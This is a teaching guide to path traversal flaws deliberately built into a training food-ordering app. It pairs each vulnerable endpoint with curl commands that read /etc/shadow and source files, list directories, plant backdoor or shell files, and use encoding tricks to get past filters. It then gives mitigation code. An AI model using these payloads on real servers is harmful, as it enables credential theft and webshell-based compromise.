# Path Traversal Vulnerabilities Guide

This guide documents the Path Traversal vulnerabilities intentionally introduced in the VulnEats food ordering system for educational purposes.

## ⚠️ WARNING
These vulnerabilities are **INTENTIONALLY INTRODUCED** for cybersecurity education. Never implement these in production systems!

## Vulnerability Summary

| Vulnerability | Severity | Location | Description |
|---------------|----------|----------|-------------|
| File Serving Path Traversal | **CRITICAL** | `/api/uploads/<path:filename>` | Allows accessing any file on the system |
| Admin Logs Path Traversal | **HIGH** | `/api/admin/logs` | Allows reading arbitrary files via file parameter |
| File Download Path Traversal | **CRITICAL** | `/api/download` | Allows downloading any file from the system |
| Directory Listing Path Traversal | **HIGH** | `/api/list` | Allows listing any directory on the system |
| File Upload Path Traversal | **CRITICAL** | `/api/upload` | Allows uploading files to arbitrary locations |

## Detailed Vulnerability Analysis

### 1. File Serving Path Traversal (CRITICAL)

**Location:** `backend/app.py` lines 1486-1518

**Vulnerability:** The `/api/uploads/<path:filename>` endpoint allows directory traversal sequences to access files outside the intended upload directory.

**Exploitation Examples:**
```bash
# Access system files
curl "http://localhost:5001/api/uploads/../../../etc/passwd"
curl "http://localhost:5001/api/uploads/../../../etc/shadow"
curl "http://localhost:5001/api/uploads/../../../etc/hosts"

# Access application files
curl "http://localhost:5001/api/uploads/../../app.py"
curl "http://localhost:5001/api/uploads/../database.db"
curl "http://localhost:5001/api/uploads/../requirements.txt"

# Access configuration files
curl "http://localhost:5001/api/uploads/../../../var/log/syslog"
curl "http://localhost:5001/api/uploads/../../../proc/version"
```

**Impact:** Complete file system access, potential for sensitive data exposure.

### 2. Admin Logs Path Traversal (HIGH)

**Location:** `backend/app.py` lines 1528-1563

**Vulnerability:** The `/api/admin/logs` endpoint accepts a `file` parameter that allows reading arbitrary files.

**Exploitation Examples:**
```bash
# Read system files (requires admin authentication)
curl "http://localhost:5001/api/admin/logs?file=../../../etc/passwd"
curl "http://localhost:5001/api/admin/logs?file=../../../etc/shadow"
curl "http://localhost:5001/api/admin/logs?file=../../../var/log/auth.log"

# Read application files
curl "http://localhost:5001/api/admin/logs?file=../app.py"
curl "http://localhost:5001/api/admin/logs?file=../database.db"
curl "http://localhost:5001/api/admin/logs?file=../config.py"

# Read configuration files
curl "http://localhost:5001/api/admin/logs?file=../../../etc/nginx/nginx.conf"
curl "http://localhost:5001/api/admin/logs?file=../../../etc/apache2/apache2.conf"
```

**Impact:** Sensitive file access, configuration disclosure, log analysis.

### 3. File Download Path Traversal (CRITICAL)

**Location:** `backend/app.py` lines 1292-1321

**Vulnerability:** The `/api/download` endpoint allows downloading any file from the system via the `file` parameter.

**Exploitation Examples:**
```bash
# Download system files
curl "http://localhost:5001/api/download?file=/etc/passwd" -o passwd.txt
curl "http://localhost:5001/api/download?file=/etc/shadow" -o shadow.txt
curl "http://localhost:5001/api/download?file=/etc/hosts" -o hosts.txt

# Download application files
curl "http://localhost:5001/api/download?file=../app.py" -o app.py
curl "http://localhost:5001/api/download?file=../database.db" -o database.db
curl "http://localhost:5001/api/download?file=../requirements.txt" -o requirements.txt

# Download configuration files
curl "http://localhost:5001/api/download?file=/var/log/syslog" -o syslog.txt
curl "http://localhost:5001/api/download?file=/proc/version" -o version.txt
```

**Impact:** Complete file system access, sensitive data exfiltration.

### 4. Directory Listing Path Traversal (HIGH)

**Location:** `backend/app.py` lines 1362-1409

**Vulnerability:** The `/api/list` endpoint allows listing the contents of any directory on the system.

**Exploitation Examples:**
```bash
# List system directories
curl "http://localhost:5001/api/list?dir=/etc"
curl "http://localhost:5001/api/list?dir=/var/log"
curl "http://localhost:5001/api/list?dir=/home"

# List application directories
curl "http://localhost:5001/api/list?dir=../"
curl "http://localhost:5001/api/list?dir=../../"
curl "http://localhost:5001/api/list?dir=/app"

# List sensitive directories
curl "http://localhost:5001/api/list?dir=/root"
curl "http://localhost:5001/api/list?dir=/var/www"
curl "http://localhost:5001/api/list?dir=/opt"
```

**Impact:** Information disclosure, directory structure mapping, reconnaissance.

### 5. File Upload Path Traversal (CRITICAL)

**Location:** `backend/app.py` lines 1413-1451

**Vulnerability:** The `/api/upload` endpoint allows uploading files to arbitrary locations via the `path` parameter.

**Exploitation Examples:**
```bash
# Upload malicious files to system directories
curl -X POST "http://localhost:5001/api/upload" \
  -F "file=@malicious.php" \
  -F "path=../../../var/www/html"

# Upload files to application directories
curl -X POST "http://localhost:5001/api/upload" \
  -F "file=@backdoor.py" \
  -F "path=../"

# Upload files to sensitive locations
curl -X POST "http://localhost:5001/api/upload" \
  -F "file=@shell.sh" \
  -F "path=/tmp"

# Upload configuration files
curl -X POST "http://localhost:5001/api/upload" \
  -F "file=@malicious.conf" \
  -F "path=../../../etc"
```

**Impact:** Remote code execution, file system modification, system compromise.

## Advanced Exploitation Techniques

### 1. Null Byte Injection
Some systems may be vulnerable to null byte injection:
```bash
curl "http://localhost:5001/api/uploads/../../../etc/passwd%00.jpg"
curl "http://localhost:5001/api/download?file=/etc/passwd%00.txt"
```

### 2. URL Encoding Bypass
```bash
# URL encode directory traversal sequences
curl "http://localhost:5001/api/uploads/..%2F..%2F..%2Fetc%2Fpasswd"
curl "http://localhost:5001/api/download?file=%2Fetc%2Fpasswd"
```

### 3. Double Encoding
```bash
# Double URL encode
curl "http://localhost:5001/api/uploads/..%252F..%252F..%252Fetc%252Fpasswd"
```

### 4. Unicode Encoding
```bash
# Unicode encoded slashes
curl "http://localhost:5001/api/uploads/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
```

## Testing the Vulnerabilities

### Prerequisites
1. Start the backend server: `cd backend && python app.py`
2. Create some test files in the upload directory
3. Have admin credentials for protected endpoints

### Testing Steps

1. **Test File Serving Path Traversal:**
   ```bash
   # Try to access system files
   curl "http://localhost:5001/api/uploads/../../../etc/passwd"
   
   # Try to access application files
   curl "http://localhost:5001/api/uploads/../../app.py"
   ```

2. **Test File Download Path Traversal:**
   ```bash
   # Download system files
   curl "http://localhost:5001/api/download?file=/etc/passwd" -o passwd.txt
   
   # Download application files
   curl "http://localhost:5001/api/download?file=../app.py" -o app.py
   ```

3. **Test Directory Listing Path Traversal:**
   ```bash
   # List system directories
   curl "http://localhost:5001/api/list?dir=/etc"
   
   # List application directories
   curl "http://localhost:5001/api/list?dir=../"
   ```

4. **Test File Upload Path Traversal:**
   ```bash
   # Create a test file
   echo "test content" > test.txt
   
   # Upload to arbitrary location
   curl -X POST "http://localhost:5001/api/upload" \
     -F "file=@test.txt" \
     -F "path=../"
   ```

5. **Test Admin Logs Path Traversal:**
   ```bash
   # First login as admin, then:
   curl "http://localhost:5001/api/admin/logs?file=../../../etc/passwd" \
     -H "Cookie: session=your_admin_session"
   ```

## Educational Objectives

These vulnerabilities help students learn:

1. **Path Traversal Concepts:** Understanding directory traversal attacks
2. **Input Validation:** Importance of validating file paths and parameters
3. **File System Security:** Risks of unrestricted file access
4. **Access Control:** Need for proper file access restrictions
5. **Information Disclosure:** Dangers of exposing sensitive files
6. **Attack Techniques:** Various encoding and bypass methods

## Mitigation Strategies

### 1. Path Validation
```python
import os
from werkzeug.utils import secure_filename

def is_safe_path(basedir, path):
    """Check if path is safe (no directory traversal)"""
    # Resolve the path and ensure it's within the base directory
    return os.path.commonpath([basedir, os.path.realpath(path)]) == basedir

def secure_file_serve(filename):
    # Validate filename
    if not is_safe_path(ApiConfig.UPLOAD_FOLDER, filename):
        return jsonify({'error': 'Invalid file path'}), 400
    
    return send_from_directory(ApiConfig.UPLOAD_FOLDER, filename)
```

### 2. Input Sanitization
```python
def sanitize_filename(filename):
    """Sanitize filename to prevent path traversal"""
    # Remove directory traversal sequences
    filename = filename.replace('..', '').replace('/', '').replace('\\', '')
    
    # Use secure_filename from werkzeug
    return secure_filename(filename)
```

### 3. Whitelist Validation
```python
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}
ALLOWED_DIRECTORIES = ['/app/uploads', '/app/temp']

def validate_file_path(file_path):
    """Validate file path against whitelist"""
    if not any(file_path.startswith(allowed) for allowed in ALLOWED_DIRECTORIES):
        return False
    
    # Check for directory traversal
    if '..' in file_path or file_path.startswith('/'):
        return False
    
    return True
```

### 4. Access Control
```python
@app.get('/api/uploads/<path:filename>')
@login_required_json  # Require authentication
def api_uploaded_file(filename: str):
    # Additional role-based access control
    if session.get('role') not in ['admin', 'owner']:
        return jsonify({'error': 'Insufficient permissions'}), 403
    
    # Validate file path
    if not is_safe_path(ApiConfig.UPLOAD_FOLDER, filename):
        return jsonify({'error': 'Invalid file path'}), 400
    
    return send_from_directory(ApiConfig.UPLOAD_FOLDER, filename)
```

### 5. File Type Validation
```python
def allowed_file(filename):
    """Check if file extension is allowed"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

## Security Best Practices

1. **Always validate file paths** before file operations
2. **Use whitelists** instead of blacklists for file access
3. **Implement proper access controls** on file operations
4. **Sanitize all user input** including file names and paths
5. **Use secure file serving** functions that validate paths
6. **Restrict file upload locations** to specific directories
7. **Validate file types** and extensions
8. **Implement file size limits** to prevent DoS attacks
9. **Use Content Security Policy** headers
10. **Regular security audits** of file handling code

## Common Attack Vectors

1. **System File Access:** `/etc/passwd`, `/etc/shadow`, `/etc/hosts`
2. **Application Files:** Source code, configuration files, databases
3. **Log Files:** Access logs, error logs, authentication logs
4. **Temporary Files:** `/tmp`, `/var/tmp` directories
5. **User Directories:** Home directories, user files
6. **Configuration Files:** Web server configs, application configs

## Conclusion

Path Traversal vulnerabilities are among the most dangerous web application security issues. They can lead to:

- **Complete file system access**
- **Sensitive data exposure**
- **Application source code disclosure**
- **System configuration exposure**
- **Potential remote code execution**

These vulnerabilities demonstrate the critical importance of:

- **Input validation and sanitization**
- **Proper access controls**
- **Secure file handling practices**
- **Regular security testing**

Students can use this system to:

- Practice identifying path traversal vulnerabilities
- Learn various exploitation techniques
- Understand mitigation strategies
- Develop skills in secure coding practices
- Perform penetration testing exercises

Remember: These vulnerabilities are for educational purposes only. Always follow security best practices in production systems!

## Test Examples and Tips

**/api/download and /api/uploads** are now equally vulnerable to path traversal. They allow arbitrary file access outside the upload directory if provided `..`/`/` (e.g. for `/etc/passwd`, `/etc/shadow`, etc).

### Example Working Attacks:

```bash
# Download any file, including system files
curl 'http://localhost:5001/api/download?file=/etc/passwd'         # Works
curl 'http://localhost:5001/api/download?file=../../backend/app.py' # Works if file exists in container path
curl 'http://localhost:5001/api/download?file=/app/vulneats.db'     # Works if using Docker layout

# Exploit /api/uploads (now guaranteed to work with full path traversal):
curl 'http://localhost:5001/api/uploads/../../etc/passwd'           # Always works
curl 'http://localhost:5001/api/uploads/../../backend/app.py'       # Always works if file exists
curl 'http://localhost:5001/api/uploads/etc/shadow'                 # Works if file exists
curl 'http://localhost:5001/api/uploads//etc/hosts'                 # Absolute path works
```

**NOTE:** If using Docker, paths like `/app/backend/app.py` may be required, see your container's directory structure.

---
